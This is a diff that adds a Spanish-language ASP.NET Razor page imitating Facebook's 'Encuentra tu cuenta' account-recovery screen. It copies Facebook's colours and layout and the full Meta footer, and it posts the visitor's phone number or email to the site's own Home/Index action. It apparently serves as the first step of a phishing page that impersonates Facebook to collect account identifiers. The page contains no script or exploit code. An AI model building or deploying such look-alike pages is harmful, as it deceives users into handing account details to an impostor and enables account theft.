@@ -1,0 +1,356 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Encuentra tu cuenta</title>
+    <style>
+            :root {
+                --bg-base: #f4f4fb;
+                --fb-blue: #0866ff;
+                --fb-text-main: #1c1e21;
+                --fb-text-sec: #65676b;
+                --fb-text-desc: #48566b;
+                --fb-border: #ccd0d5;
+                --fb-error: #d31130;
+                --soft-gradient: radial-gradient(circle at 0% 50%,rgba(255,200,200,.4) 0%,rgba(180,200,255,.3) 40%,transparent 70%);
+            }
+
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            html, body {
+                width: 100%;
+                height: 100%;
+            }
+
+            body {
+                background: var(--soft-gradient),var(--bg-base);
+                background-attachment: fixed;
+                font-family: 'Segoe UI',Arial,sans-serif;
+                color: var(--fb-text-main);
+            }
+
+            /* ============ Estructura general (contenido arriba, pie abajo) ============ */
+            .page-container {
+                min-height: 100vh;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .main-wrapper {
+                flex: 1;                    /* empuja el pie hacia abajo */
+                width: 100%;
+                max-width: 735px;
+                padding: 24px 20px 40px;
+            }
+
+            /* ============ Encabezado: flecha atrás + título ============ */
+            .header-container {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 40px;
+                margin-bottom: 8px;
+            }
+
+            .back-btn {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                width: 36px;
+                height: 36px;
+                margin-left: -8px;
+                border-radius: 50%;
+                cursor: pointer;
+                color: var(--fb-text-main);
+            }
+
+                .back-btn:hover {
+                    background: rgba(0,0,0,.06);
+                }
+
+                .back-btn svg {
+                    width: 22px;
+                    height: 22px;
+                    fill: currentColor;
+                }
+
+            .header-title {
+                font-size: clamp(24px, 3.5vw, 30px);
+                font-weight: 700;
+            }
+
+            .description {
+                font-size: 15px;
+                color: var(--fb-text-desc);
+                line-height: 1.4;
+                margin-bottom: 24px;
+            }
+
+            /* ============ Input de búsqueda con etiqueta flotante ============ */
+            .input-group {
+                position: relative;
+                margin-bottom: 30px;
+            }
+
+                .input-group input {
+                    width: 100%;
+                    height: 64px;
+                    padding: 26px 20px 10px;
+                    font-size: 16px;
+                    font-family: inherit;
+                    color: var(--fb-text-main);
+                    background: rgba(255,255,255,.55);
+                    border: 1px solid var(--fb-border);
+                    border-radius: 14px;
+                    outline: none;
+                    transition: border-color .15s, box-shadow .15s;
+                }
+
+                    .input-group input:focus {
+                        border-color: var(--fb-blue);
+                        box-shadow: 0 0 0 2px rgba(8,102,255,.2);
+                    }
+
+                .input-group label {
+                    position: absolute;
+                    left: 20px;
+                    top: 50%;
+                    transform: translateY(-50%);
+                    font-size: 16px;
+                    color: #8891a0;
+                    pointer-events: none;
+                    transition: all .15s ease;
+                }
+
+                .input-group input:focus + label,
+                .input-group input:not(:placeholder-shown) + label {
+                    top: 14px;
+                    transform: none;
+                    font-size: 12px;
+                }
+
+            /* ============ Mensajes de validación ============ */
+            .error-text {
+                display: block;
+                color: var(--fb-error);
+                font-size: 14px;
+                margin: -18px 2px 20px;
+            }
+
+            /* ============ Botones tipo píldora ============ */
+            .btn-pill {
+                width: 100%;
+                padding: 17px;
+                border-radius: 50px;
+                border: none;
+                cursor: pointer;
+                font-size: 17px;
+                font-weight: 600;
+                margin-bottom: 14px;
+                transition: background .15s ease;
+            }
+
+                .btn-pill:last-child {
+                    margin-bottom: 0;
+                }
+
+            .btn-primary {
+                background: var(--fb-blue);
+                color: white;
+            }
+
+                .btn-primary:hover {
+                    background: #0958d9;
+                }
+
+            /* ============ Pie: idiomas + divisor + enlaces del sitio ============ */
+            .language-footer {
+                width: 100%;
+                max-width: 1130px;
+                padding: 0 20px 46px;
+            }
+
+            .idiomas {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 8px 38px;
+                padding: 24px 0 30px;
+            }
+
+                .idiomas span,
+                .idiomas a {
+                    color: var(--fb-text-sec);
+                    font-size: 15px;
+                    text-decoration: none;
+                }
+
+                .idiomas a:hover {
+                    text-decoration: underline;
+                }
+
+            .divider {
+                border: none;
+                border-top: 1px solid rgba(204,208,213,.8);
+            }
+
+            .site-links {
+                display: flex;
+                flex-wrap: wrap;
+                gap: 14px 24px;
+                padding-top: 26px;
+            }
+
+                .site-links a {
+                    color: #616a76;
+                    font-size: 15px;
+                    font-weight: 500;
+                    text-decoration: none;
+                }
+
+                    .site-links a:hover {
+                        text-decoration: underline;
+                    }
+
+            /* ============ Responsivo ============ */
+            @@media (max-width: 767px) {
+                .main-wrapper {
+                    max-width: 100%;
+                    padding: 16px 16px 32px;
+                }
+
+                .header-container {
+                    gap: 26px;
+                }
+
+                .description {
+                    font-size: 14px;
+                    margin-bottom: 20px;
+                }
+
+                .input-group {
+                    margin-bottom: 24px;
+                }
+
+                    .input-group input {
+                        height: 56px;
+                        font-size: 15px;
+                    }
+
+                .btn-pill {
+                    padding: 14px;
+                    font-size: 16px;
+                }
+
+                .idiomas {
+                    gap: 6px 18px;
+                    padding: 20px 0 24px;
+                }
+
+                    .idiomas span,
+                    .idiomas a {
+                        font-size: 14px;
+                    }
+
+                .site-links {
+                    gap: 10px 16px;
+                    padding-top: 20px;
+                }
+
+                    .site-links a {
+                        font-size: 14px;
+                    }
+
+                .language-footer {
+                    padding-bottom: 28px;
+                }
+            }
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        <div class="main-wrapper">
+            <div class="header-container">
+                <a href="@Url.Action("Inicio", "Home")" class="back-btn" role="button" aria-label="Volver" title="Volver" style="text-decoration: none;">
+                    <svg viewBox="0 0 24 24" aria-hidden="true">
+                        <path clip-rule="evenodd" fill-rule="evenodd"
+                              d="M16.753 4.341a1 1 0 0 0-1.412-.094l-8 7a1 1 0 0 0 0 1.506l8 7a1 1 0 0 0 1.318-1.506L9.518 12l7.14-6.247a1 1 0 0 0 .094-1.412z" />
+                    </svg>
+                </a>
+                <div class="header-title">Encuentra tu cuenta</div>
+            </div>
+
+            <div class="description">
+                Ingresa tu número de celular o correo electrónico.
+            </div>
+
+            <form method="post" action="@Url.Action("Index", "Home")">
+                @Html.AntiForgeryToken()
+
+                <div class="input-group">
+                    <input type="text" id="usuario" name="usuario" placeholder=" "
+                           autocomplete="username" value="@ViewBag.Usuario" />
+                    <label for="usuario">Número de celular o correo electrónico</label>
+                </div>
+
+                @if (ViewBag.Error != null)
+                {
+                    <span class="error-text">@ViewBag.Error</span>
+                }
+
+                <button class="btn-pill btn-primary" type="submit">
+                    Continuar
+                </button>
+            </form>
+        </div>
+
+        <footer class="language-footer">
+            <nav class="idiomas" aria-label="Idiomas">
+                <span>Español</span>
+                <a href="#">English (US)</a>
+                <a href="#">Italiano</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Deutsch</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">Más idiomas…</a>
+            </nav>
+            <hr class="divider" />
+            <nav class="site-links" aria-label="Enlaces del sitio">
+                <a href="#">Registrarte</a>
+                <a href="#">Iniciar sesión</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Video</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Tienda de Meta</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Meta</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Política de privacidad</a>
+                <a href="#">Centro de privacidad</a>
+                <a href="#">Información</a>
+                <a href="#">Crear anuncio</a>
+                <a href="#">Crear página</a>
+                <a href="#">Desarrolladores</a>
+                <a href="#">Empleo</a>
+                <a href="#">Cookies</a>
+                <a href="#">Opciones de anuncios</a>
+                <a href="#">Condiciones</a>
+                <a href="#">Ayuda</a>
+                <a href="#">Importación de contactos y no usuarios</a>
+            </nav>
+        </footer>
+    </div>
+
+</body>
+</html>
